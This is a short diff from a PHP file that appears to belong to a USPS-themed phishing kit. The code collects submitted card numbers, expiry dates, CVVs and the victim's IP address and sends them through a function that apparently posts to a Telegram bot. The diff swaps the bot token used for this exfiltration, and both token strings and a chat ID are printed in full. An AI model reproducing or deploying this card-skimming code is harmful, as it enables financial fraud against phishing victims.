@@ -39,7 +39,7 @@ if(isset($_POST['okbb'])){
     $message .= "cc  : ".$cc."\nexp : ".$exp."\ncvv : ".$cvv."\nIP      : ".$ip."\n";
     $message .= "-------------------- <3 USPS <3-------------------\n";
 
-	sendMessageT('1064643518',$message,'6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk');
+	sendMessageT('1064643518',$message,'6367338929:AAHMMbQSLxEpLOkX1027eYvgaumrd9-NRCk');
     $_SESSION["msg"] = $message;
 
     if ($sms=='1'){
